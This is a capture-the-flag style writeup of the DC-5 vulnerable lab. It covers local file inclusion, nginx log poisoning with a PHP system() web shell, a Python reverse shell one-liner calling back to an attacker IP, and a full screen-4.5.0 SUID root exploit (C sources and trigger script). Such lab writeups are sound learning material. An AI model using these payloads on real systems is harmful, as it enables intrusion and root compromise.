---
layout: default
title : muzec - DC-5 Writeup
---

![image](https://user-images.githubusercontent.com/69868171/119848672-00c52480-beda-11eb-84c3-6fadfed216a7.png)

DC-5 is another purposely built vulnerable lab with the intent of gaining experience in the world of penetration testing.

The plan was for DC-5 to kick it up a notch, so this might not be great for beginners, but should be ok for people with intermediate or better experience. Time will tell (as will feedback).

As far as I am aware, there is only one exploitable entry point to get in (there is no SSH either). This particular entry point may be quite hard to identify, but it is there. You need to look for something a little out of the ordinary (something that changes with a refresh of a page). This will hopefully provide some kind of idea as to what the vulnerability might involve.

And just for the record, there is no phpmailer exploit involved. :-)

The ultimate goal of this challenge is to get root and to read the one and only flag.

Linux skills and familiarity with the Linux command line are a must, as is some experience with basic penetration testing tools.


We always start with an nmap scan.....

```Nmap -sC -sV -oA nmap <Target-IP>```

```
# Nmap 7.91 scan initiated Thu May 27 05:45:51 2021 as: nmap -sC -p- -sV -oA nmap 172.16.139.185
Nmap scan report for DC-5 (172.16.139.185)
Host is up (0.0015s latency).
Not shown: 65532 closed ports
PORT      STATE SERVICE VERSION
80/tcp    open  http    nginx 1.6.2
|_http-server-header: nginx/1.6.2
|_http-title: Welcome
111/tcp   open  rpcbind 2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  3,4          111/tcp6  rpcbind
|   100000  3,4          111/udp6  rpcbind
|   100024  1          47835/udp   status
|   100024  1          51334/udp6  status
|   100024  1          52216/tcp   status
|_  100024  1          54172/tcp6  status
52216/tcp open  status  1 (RPC #100024)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Thu May 27 05:46:08 2021 -- 1 IP address (1 host up) scanned in 16.99 seconds
```

Scanning for full ports give us 3 open port but since the lab only focus on the port 80 HTTP let hit it to start enumerating.

![image](https://user-images.githubusercontent.com/69868171/119848672-00c52480-beda-11eb-84c3-6fadfed216a7.png)

We are on the webpage let look around and find something vulnerable spend sometime checking so i landed on the contact page.

![image](https://user-images.githubusercontent.com/69868171/119849779-e93a6b80-beda-11eb-892f-8b382fcbace5.png)

Let try to contact them and also checking for sql injection but nop not the way in so checking the `url` we have after sending them a mail.

`http://172.16.139.186/thankyou.php?firstname=&lastname=&country=australia&subject=` looking like LFI right?? sound interesting.

![image](https://user-images.githubusercontent.com/69868171/119850380-7d0c3780-bedb-11eb-8656-dd0722043a51.png)

Not going to lie getting the right parameter is a really pain but guess what we learn everyday it something simple but my mind was not set there at all so let continue.

`http://172.16.139.186/thankyou.php?file=/etc/passwd` here the right parameter is `file` probably by guessing to took me long.

![image](https://user-images.githubusercontent.com/69868171/119851068-1b000200-bedc-11eb-846c-d0789999fc3b.png)

### LFI To SHELL Through Log Poisoning 

We know our web server is Nginx so to poison it is easy since we know the path with the help of little research from google.

let intercept our request with burp and send it to the repeater tab in burp `<?php system ($_GET['rev']) ?>`

![image](https://user-images.githubusercontent.com/69868171/119852582-69fa6700-bedd-11eb-9224-b6c672dfbedb.png)

Let confirm it if we poisoning it `http://172.16.139.186/thankyou.php?file=/var/log/nginx/error.log`

![image](https://user-images.githubusercontent.com/69868171/119852751-93b38e00-bedd-11eb-9a4c-84dfc4ffe02e.png)

Boom defintely we do let run some command back to our burp `/var/log/nginx/error.log&rev=ls` the path am talking about with a little twist that we added to poison the web server.

![image](https://user-images.githubusercontent.com/69868171/119852972-c5c4f000-bedd-11eb-8d5c-10be66db1834.png)


### Getting Reverse Shell

`python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.10.10",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'` 

NOTE:- edit the port and IP and also start an Ncat listener now let run it to get our shell.

![image](https://user-images.githubusercontent.com/69868171/119853808-834fe300-bede-11eb-9f49-30ffd6571ab4.png)

Shell below;

![image](https://user-images.githubusercontent.com/69868171/119853870-91056880-bede-11eb-8377-286c663c191f.png)

Spawning a TTY shell making shell stable also to make so cool to use i know i love using the words cool lol .

`python -c'import pty; pty.spawn ("/bin/bash")'` and i think we are good to go.

![image](https://user-images.githubusercontent.com/69868171/119854351-01ac8500-bedf-11eb-8d18-ba03af89423c.png)

Checking all folder found nothing so i decided to check for SUID with `find / -perm -u=s -type f 2>/dev/null` to list out SUID files.

![image](https://user-images.githubusercontent.com/69868171/119854635-3ae4f500-bedf-11eb-9c14-07f151dc5bee.png)

Seems we have `/bin/screen-4.5.0` let check for exploit.

![image](https://user-images.githubusercontent.com/69868171/119854944-839cae00-bedf-11eb-9139-3d26bfc6e999.png)

Nice.

### Privilege Escalation

We have to do now is to create the exploit we have already but we some fixing to do.

![image](https://user-images.githubusercontent.com/69868171/119855704-23f2d280-bee0-11eb-9ff9-c5da52e2636b.png)

Now let do the right thing.

```
#include <stdio.h>                                                                 
#include <sys/types.h>       
#include <unistd.h>                                                                                                                                                    
__attribute__ ((__constructor__))                                                                                                                                      
void dropshell(void){                                                                                                                                                  
    chown("/tmp/rootshell", 0, 0);                                                                                                                                     
    chmod("/tmp/rootshell", 04755);                                                                                                                                    
    unlink("/etc/ld.so.preload");                                                                                                                                      
    printf("[+] done!\n");
}          
```

Let save it in a file name `exploit.c`

```
#include <stdio.h>
int main(void){                          
    setuid(0);                                                                     
    setgid(0);
    seteuid(0);                          
    setegid(0);                                                                    
    execvp("/bin/sh", NULL, NULL);
}
```

Let save in a file name `rootshell.c` 

```
echo "[+] Now we create our /etc/ld.so.preload file..."
cd /etc
umask 000 # because
screen -D -m -L ld.so.preload echo -ne  "\x0a/tmp/libhax.so" # newline needed
echo "[+] Triggering..."
screen -ls # screen itself is setuid, so... 
/tmp/rootshell 
```

Let save it in a file name `root.sh`

![image](https://user-images.githubusercontent.com/69868171/119856748-f78b8600-bee0-11eb-9634-f82bda6b30f5.png)


Now we need to compile it.

```
gcc -fPIC -shared -ldl -o libhax.so exploit.c
gcc -o rootshell rootshell.c
```

![image](https://user-images.githubusercontent.com/69868171/119857040-3c172180-bee1-11eb-950f-efc9623dcf32.png)

Now let upload it on the target.

![image](https://user-images.githubusercontent.com/69868171/119857837-e68f4480-bee1-11eb-87cc-4e3246f7c393.png)

We have all files on the target now let give the file with the name `root.sh` permission `chmod +x root.sh` now let run it.

![image](https://user-images.githubusercontent.com/69868171/119858246-4b4a9f00-bee2-11eb-99b3-9466253409cf.png)

Rooooooooooooooooooot let now get the flag.txt.

![image](https://user-images.githubusercontent.com/69868171/119858426-7503c600-bee2-11eb-9c0b-80f99d9802e5.png)

Box rooted and we are done.

Greeting From [Muzec](https://twitter.com/muzec_saminu)

<br> <br>
[Back To Home](../index.md)
<br>
